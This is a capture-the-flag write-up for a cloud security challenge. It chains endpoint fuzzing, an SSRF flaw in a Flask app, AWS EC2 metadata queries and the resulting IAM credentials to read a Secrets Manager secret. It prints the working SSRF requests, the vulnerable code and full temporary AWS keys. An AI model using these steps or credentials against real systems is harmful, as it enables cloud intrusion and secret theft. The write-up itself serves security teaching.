# Request for Knowledge
```
Keep looking! I know you want to know the secrets of the cloud.

** The Cloud security challenges are provided by SEC Consult **
http://3.64.214.139//??????? 
```

The description hints at the existance of another endpoint, so we'll try using `ffuf` to find it:
```
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://3.64.214.139/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://3.64.214.139/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

request                 [Status: 200, Size: 1256, Words: 298, Lines: 47]
calc                    [Status: 405, Size: 153, Words: 16, Lines: 6]
```
quickly revealing that the hinted endpoint is `/request`.

Visiting `http://3.64.214.139/request` reveals us the default home page for `example.com`:
![](./images/example_com.png)

This could primarily mean two things:
- We're shown a copy of `example.com` for whatever reason (maybe there's more things we could find with `ffuf`?)
- We're shown the real `example.com`, meaning there could be a way for us to possibly fetch other sites (=> [SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf))

If this is the real `example.com`, we could confirm this by trying to fuzz possible parameters to see if we can control the URL it shows with `ffuf`:
```
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://3.64.214.139/request?FUZZ=a -fc 200 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://3.64.214.139/request?FUZZ=a
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 200
________________________________________________

url                     [Status: 500, Size: 265, Words: 33, Lines: 6]
```
so whenever we have the `url` parameter set to an invalid URL the page will error, indicating that we can indeed control what page it requests. We can also confirm this by visiting `http://3.64.214.139/request?url=http://google.com`, showing us Google's home page!

Knowing that this is ran on AWS (either by the previous parts of the challenge, or the IP range used by the website), we can try accessing the [instance metadata endpoint](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) exposed to EC2 instances if this is ran on EC2:
```
└─$ curl http://3.64.214.139/request?url=http://169.254.169.254/latest/              
dynamic
meta-data
user-data   
```
and the website indeed is running on EC2.

This allows us to get additional information about the instance, which is separated into 3 categories:
- dynamic: associated information with the instance on AWS' side (account id, instance id, instance type, image id, region)
- meta-data: instance-specific information (hostname, network interfaces, IAM credentials it uses, etc.)
- user-data: commands that should be executed on the instance (used by [cloud-init](https://cloudinit.readthedocs.io/en/latest/topics/format.html), helps automating infrastructure deployment)

The dynamic endpoints aren't very interesting for us, as we already know most of that information that matters from previous challenges in the category.

The meta-data endpoints allows us to find two different IAM credentials located at the following paths:
- http://3.64.214.139/request?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role
- http://3.64.214.139/request?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

Bruteforcing both of their permissions with [pacu](https://github.com/RhinoSecurityLabs/pacu) and [enumerate-iam](https://github.com/andresriancho/enumerate-iam) does not yield anything interesting other than being able to screenshot instance's console, though trying this with the instance ID fails as the permissions for it are restricted per instance and not globally by default. It's worth noting that these tools don't detect all possible permissions we can use but more or less detect permissions that we definitely can't use, as certain commands require additional arguments like instance ID which the tools can't know when the credentials don't have permission to list things. So without knowing more specifically what we need to do, these credentials don't have much use for now.

Checking the user-data reveals to us how the EC2 instance was provisioned:
```
└─$ curl http://3.64.214.139/request?url=http://169.254.169.254/latest/user-data                                                           
#!/usr/bin/bash
sudo apt update
sudo apt install -y docker.io net-tools curl
sleep 5
sudo useradd -m -s /usr/bin/bash -u 1337 ec2nullconadmin
sudo mkdir /home/ec2nullconadmin/.ssh
sudo echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcjVtTWufmom054OxYi2tnNKGX/f01pu2awD6U6VNoaHNHEMfBinmzYp11SzFz4b5ugumv1J8D3EO5ewyVk3eJahfQSbjBCUSNP/ZZMjQI9ppudnIBMN286whVDtAgQmLES7RfYRU0nszB2d2wcgH7FtG6T+Ip7MKHggCaUxZ7OULWly5dmdQlJr/0gQGd6Zp+AyOPoAWds//6YNADc+7X1ZAAwpfTlC+ETnbFZr0Aeip3n6PX5qMP25SFwvHBJrjm88mdnKR66Tf4sZKmmI3kO/Kdqbz6Vouxr2cP+ipVWoDi2m5MGxgn1TtkeYICoZjvkcBMLwIWOuCsRDVvGuXX" >> /home/ec2nullconadmin/.ssh/authorized_keys
sudo chown ec2nullconadmin:ec2nullconadmin /home/ec2nullconadmin/.ssh /home/ec2nullconadmin/.ssh/authorized_keys
sudo chmod 700 /home/ec2nullconadmin/.ssh
sudo chmod 600 /home/ec2nullconadmin/.ssh/authorized_keys


sudo docker run -d -p 80:80 fjse3983mr9mfv90s/eprounf923382fnd9po823
```
which sets up an SSH key for the account `ec2nullconadmin` and then runs a Docker container with the image `fjse3983mr9mfv90s/eprounf923382fnd9po823`.

As the Docker image is named with the intention to not be easily findable, we'll investigate if it has anything interesting inside:
```
└─$ docker pull fjse3983mr9mfv90s/eprounf923382fnd9po823
[...]

└─$ docker history fjse3983mr9mfv90s/eprounf923382fnd9po823 --no-trunc
IMAGE                                                                     CREATED        CREATED BY                                                                                                             SIZE      COMMENT
sha256:41f78828616db4e360be8cb6d9e544558b200c07a79da33af7b08c4c3ebfcba8   2 days ago     /bin/sh -c #(nop)  ENTRYPOINT ["/var/www/run_server.sh"]                                                               0B        
<missing>                                                                 2 days ago     /bin/sh -c #(nop)  USER www-data                                                                                       0B        
<missing>                                                                 2 days ago     |1 DEBIAN_FRONTEND=noninteractive /bin/sh -c chmod +x webserver.py run_server.sh                                       2.92kB    
<missing>                                                                 2 days ago     /bin/sh -c #(nop) COPY file:d18145652dcb9d7acb8c68df502199cd9952d847d2f23e5ca7740e161291383e in .                      105B      
<missing>                                                                 2 days ago     /bin/sh -c #(nop) COPY file:574edbfc0b168afa97571efabc8ba639ad730ca41a29cf43cdbb1bc178f60a1b in .                      2.81kB    
<missing>                                                                 2 months ago   /bin/sh -c #(nop) WORKDIR /var/www/                                                                                    0B        
<missing>                                                                 2 months ago   |1 DEBIAN_FRONTEND=noninteractive /bin/sh -c pip3 install -U flask requests boto3                                      85.4MB    
<missing>                                                                 2 months ago   |1 DEBIAN_FRONTEND=noninteractive /bin/sh -c apt update && apt install -y python3 python3-pip iputils-ping curl wget   375MB     
<missing>                                                                 2 months ago   /bin/sh -c #(nop)  ARG DEBIAN_FRONTEND=noninteractive                                                                  0B        
<missing>                                                                 3 months ago   /bin/sh -c #(nop)  CMD ["bash"]                                                                                        0B        
<missing>                                                                 3 months ago   /bin/sh -c #(nop) ADD file:7009ad0ee0bbe5ed7f381792e07347e260e6896aeee0d80597808065120fa96b in /                       72.8MB   
```

The image seem to contain the files `webserver.py` and `run_server.sh` that may be interesting to us, and everything else seems to be part of the base image the image uses or instructions for Docker on how to run the container by default. Let us now extract those files (alternatively we can get the whole docker image with `docker save fjse3983mr9mfv90s/eprounf923382fnd9po823 -o docker_image.tar`):
```
└─$ docker run --rm --name cloud -it fjse3983mr9mfv90s/eprounf923382fnd9po823 &
└─$ docker cp cloud:/var/www/ ./
```

run_server.sh:
```
#!/bin/bash

export FLASK_APP=webserver
export FLASK_ENV=production
flask run --host="0.0.0.0" --port=80
```

webserver.py:
```
from flask import Flask
from flask import request
import subprocess
import requests as req
import boto3
import base64
import json

app = Flask(__name__)

res = req.get("http://169.254.169.254/latest/meta-data/public-ipv4")
lambda_url = f"http://{res.text}/calc"

@app.route('/')
def root_page():


    script1 = """
    <script>
    function calculate() {
        const p = document.querySelectorAll("p");
        var input = document.getElementById("calc_input").value;
        
        const xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (xhttp.readyState === 4) {
                p[0].innerText = xhttp.responseText;
            }
        }
        xhttp.open("POST",'"""
    script2 = """');
        xhttp.setRequestHeader("Content-Type", "application/json");
        var sendVar = '{"input":"'+input+'"}';
        xhttp.send(sendVar);
    }
    </script>
    """

    script = script1 + lambda_url + script2

    image1 = '<img src="https://nullcon-static-content-public-bucket.s3.eu-central-1.amazonaws.com/sec-consult.svg" />'
    html1 = '<h2> The Cloud security challenges are provided by SEC Consult</h2>'
    link1 = '<a href="https://sec-consult.com/">https://sec-consult.com/</a>'    
    calc_input = """
    <form id="calc_form">
        <label for="calc_input">Quick calculator</label><br>
        <input name="calc_input" type="text" id="calc_input"/>
        <button type="button" onclick="calculate()" >Calculate!</button>
    </form><br>
    <p id="output"></p> 
    """

    # Add loading db credentials from secrets manager
    #get_secret_value_response = boto3.client("secretsmanager", region_name="eu-central-1").get_secret_value(SecretId="database_pw")   
    #if 'SecretString' in get_secret_value_response:
    #    secret = get_secret_value_response['SecretString']["database_pw"]
    #TODO: implement database backend. Use the key webserver-private-key for direct access to the server

    return f"{script}{image1}{html1}{link1}{calc_input}"

@app.route('/request')
def req_page():
    url = request.args.get("url", "http://example.com")
    res = req.get(url)
    return res.text


@app.route('/calc', methods = ['POST'])
def calc_page():
    if request.method == 'POST':
        """little calculator"""
        request_data = request.get_json() 
        client = boto3.setup_default_session(region_name='eu-central-1')
        client = boto3.client('lambda')
        response = client.invoke(
            FunctionName = "lambda-calculator",
            InvocationType = "RequestResponse",
            Payload = '{"input":"'+str(request_data["input"])+'"}'
        )

        payload = json.loads(response['Payload'].read())
        return payload
    else:
        return "Only POST allowed"
```

The interesting part is the following:
```
# Add loading db credentials from secrets manager
#get_secret_value_response = boto3.client("secretsmanager", region_name="eu-central-1").get_secret_value(SecretId="database_pw")   
#if 'SecretString' in get_secret_value_response:
#    secret = get_secret_value_response['SecretString']["database_pw"]
```
revealing to us that there's a secret named `database_pw` that the EC2 instance should be able to access.

And as we previously found multiple EC2 credentials from the metadata endpoints, all we need to do now is to try the credentials:
```
# values from http://3.64.214.139/request?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role
└─$ AWS_REGION=eu-central-1 AWS_ACCESS_KEY_ID=ASIA22D7J5LEG4ULKCMY AWS_SECRET_ACCESS_KEY=x2lHGw7gV22YKmPwdjOwd6d4/pnGQJmhYjFzS006 AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDkaDGV1LWNlbnRyYWwtMSJHMEUCIQCrFm5Av1/CJWWsc+dE3h7JZcT1aPbpUOFUgH5yjQLI7AIgdv3bHYhxwXZggOyLxc3EB/+xzEC9M+Cj4iN02y6D+okq5QQIov//////////ARAAGgw3NDMyOTYzMzA0NDAiDL473aAatXJmk205fSq5BIKYe+pVGNFCi+Tjs8uq/ptjW2IdNgt2KSEvhi33ehITVUa1W+g7wEQItuFZtTXQP9mcM8cJi0MCoTaVh0bhAQ/Ba050HEKteEUa6u9z5Ozmxi8d4AHqiZf+o6WqoRdpnGdi/bmo/qhGgVXspYk6oTO8Tn5xQQCX+ro/ofC8z0EKm7AIOxCKz3FByw9745xbnJHX5KUecmfxh3f0EHBabAprSrUowCu7++ZFaAAx+/3vJOjmwzOT0/8tZKdBDmRT25LAz1IjDlj17M2p4ln0kVCFVEyZpuQGX06HpcGML6aF0SmFiehzS3T6qU41ARIURV6bIh77Qjw3s9XW4dJqI01Xbuqs3OwyR7qYj0/Bswl2osvQw4EP3OQGdDVzMm7BAPOzvnRxNPpSGnjfFsIJMRI+R+qYd7X3zdjhb95HLqMEvIfJobn1H99uKoc3Td+IENLzPjm60I0K3yUoduD1yJETH0YmAipa5FmZUOKIXeBahx6hVAfAQI3Gn5IzWitjbz+Ag5wojsb0eAwon56T8TEfwSqmyqtt80Ivp8rytaaCssHZdMt9/0ZhSN3H/RlyWwG6tyBsuHgFMt/z/jmraFZOv5F2Lvph+kwhXtVFFwb7JG6iBZ/ULI1pxPFbu9VYT/JMJDudUN16wFnPrseehkiI2MJicJn437dS2fvRzGG9eQpvSfEogHY0QvFJHaEh8yCM/xcT7cFAkMlrl2P/H2h1CXqJTWoWNYLucOqOza2BuGDWdt95lNxSMPf24pcGOqkB+XCveLhcIheCVcbgvboDHUSaEaeHV+eE51IWbeYQahNa1j1bdlczykZH4tQaJi4sQBWAWqbYOKrU2ciepdTGys1GToOZ75qk4Y3/Nx34PZ0aTMY7fCtGpgcZ/bNvKtghRrSk/7pzS2JiL92GzvFmAvyYFB1eGUSvI2Y6pLI7mGac425OIXoCgTlQpnxRxLB37FLvW+NjGGfQ5da3W9bLShY2Ajz+j7ae3g== aws secretsmanager get-secret-value --secret-id database_pw
{
    "ARN": "arn:aws:secretsmanager:eu-central-1:743296330440:secret:database_pw-dObJHD",
    "Name": "database_pw",
    "VersionId": "c0ae0a5e-2ece-453d-bc5a-9df73716d144",
    "SecretString": "{\"database_pw\":\"ENO{P5555T_Can_y0u_k33p_4_S3CRET}\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2022-08-11T22:51:09.716000+03:00"
}
```

Flag: `ENO{P5555T_Can_y0u_k33p_4_S3CRET}`